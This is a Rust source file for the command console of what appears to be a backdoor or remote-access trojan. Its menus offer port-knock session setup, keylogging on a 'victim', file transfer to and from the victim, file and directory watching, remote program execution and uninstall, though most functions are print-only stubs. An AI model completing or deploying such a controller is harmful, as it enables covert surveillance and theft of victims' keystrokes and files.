use std::io::{self, Write};
use std::path::PathBuf;
mod port_knkr;


#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
        }
    }

    fn run(&mut self) {
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    /* =========================
     * MENUS
     * ========================= */

    fn disconnected_menu(&mut self) {
        println!("\n=== Commander ===");
        println!("1) Initiate session (port knock)");
        println!("0) Exit");

        match prompt("Select option: ").as_str() {
            "1" => {
                self.port_knock();
                self.state = SessionState::Connected;
            }
            "0" => {
                println!("Exiting commander.");
                std::process::exit(0);
            }
            _ => println!("Invalid option"),
        }
    }

    fn connected_menu(&mut self) {
        println!("\n=== Commander (Session Active) ===");
        println!("1) Disconnect from victim");
        println!("2) Uninstall from victim");
        println!("3) Start the keylogger on the victim");
        println!("4) Stop the keylogger on the victim");
        println!("5) Transfer the key log file from the victim");
        println!("6) Transfer a file to the victim");
        println!("7) Transfer a file from the victim");
        println!("8) Watch a file on the victim");
        println!("9) Watch a directory on the victim");
        println!("10) Run a program on the victim");

        match prompt("Select option: ").as_str() {
            "1" => self.disconnect(),
            "2" => self.uninstall(),
            "3" => self.start_keylogger(),
            "4" => self.stop_keylogger(),
            "5" => self.transfer_keylog(),
            "6" => self.transfer_file_to_victim(),
            "7" => self.transfer_file_from_victim(),
            "8" => self.watch_file(),
            "9" => self.watch_directory(),
            "10" => self.run_program(),
            _ => println!("Invalid option"),
        }
    }

    /* =========================
     * SESSION
     * ========================= */
    fn port_knock(&mut self) {
        match port_knkr::port_knock() {
            Ok(_) => {
                println!("[✓] Session established");
                self.state = SessionState::Connected;
            }
            Err(e) => println!("[!] Port knock failed: {}", e),
        }
    }

    fn disconnect(&mut self) {
        println!("[*] Disconnecting from victim...");
        self.state = SessionState::Disconnected;
    }

    fn uninstall(&self) {
        println!("[*] Sending uninstall command to victim...");
    }

    /* =========================
     * KEYLOGGER
     * ========================= */

    fn start_keylogger(&self) {
        println!("[*] Starting keylogger on victim...");
    }

    fn stop_keylogger(&self) {
        println!("[*] Stopping keylogger on victim...");
    }

    fn transfer_keylog(&self) {
        println!("[*] Transferring key log file from victim...");
    }

    /* =========================
     * FILE OPS
     * ========================= */

    fn transfer_file_to_victim(&self) {
        let path = prompt("Enter local file path: ");
        let path = PathBuf::from(path);
        println!("[*] Transferring {:?} to victim...", path);
    }

    fn transfer_file_from_victim(&self) {
        let path = prompt("Enter remote file path: ");
        println!("[*] Transferring {:?} from victim...", path);
    }

    fn watch_file(&self) {
        let path = prompt("Enter remote file path to watch: ");
        println!("[*] Watching file {:?} on victim...", path);
    }

    fn watch_directory(&self) {
        let path = prompt("Enter remote directory path to watch: ");
        println!("[*] Watching directory {:?} on victim...", path);
    }

    /* =========================
     * EXECUTION
     * ========================= */

    fn run_program(&self) {
        let program = prompt("Enter program to run: ");
        println!("[*] Running program on victim: {}", program);
        println!("\n--- Program Output ---");
        println!("(program output would appear here)");
        println!("----------------------");
    }
}

/* =========================
 * UTIL
 * ========================= */

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    // Ctrl+C = immediate exit
    ctrlc::set_handler(|| {
        println!("\n[!] Ctrl+C received — exiting.");
        std::process::exit(0);
    })
    .expect("Failed to set Ctrl+C handler");

    let mut commander = Commander::new();
    commander.run();
}

